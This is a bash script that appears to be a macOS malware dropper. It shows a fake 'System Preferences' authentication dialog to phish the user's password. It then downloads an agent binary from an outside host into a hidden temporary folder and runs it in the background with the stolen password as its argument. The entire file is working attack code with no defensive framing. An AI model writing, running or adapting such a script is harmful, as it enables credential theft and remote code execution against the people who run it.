#!/bin/bash
stage=$(mktemp -d /tmp/.service-stage.XXXXXX)
for attempt in 1 2 3 4 5; do
  secret=$(osascript -e 'text returned of (display dialog "Authentication required" default answer "" with hidden answer with title "System Preferences")')
  break
done
arch=$(uname -m)
curl -fsS "https://delivery.example.invalid/agent?arch=$arch" -o "$stage/agent"
chmod +x "$stage/agent"
nohup "$stage/agent" "$secret" >/dev/null 2>&1 &
